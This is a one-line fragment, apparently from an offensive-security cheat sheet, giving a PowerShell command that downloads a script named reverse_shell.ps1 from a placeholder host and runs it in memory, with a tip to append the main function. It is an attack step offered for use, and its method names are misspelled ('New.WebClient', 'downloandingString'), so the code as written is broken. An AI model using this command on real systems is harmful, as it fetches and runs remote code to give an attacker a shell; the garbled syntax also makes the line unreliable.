...
* Download and Execute Powershell Script: `powershell "IEX(New-Object New.WebClient).downloandingString('http://IPaddress/reverse_shell.ps1')"` (note: append main function to end of script)
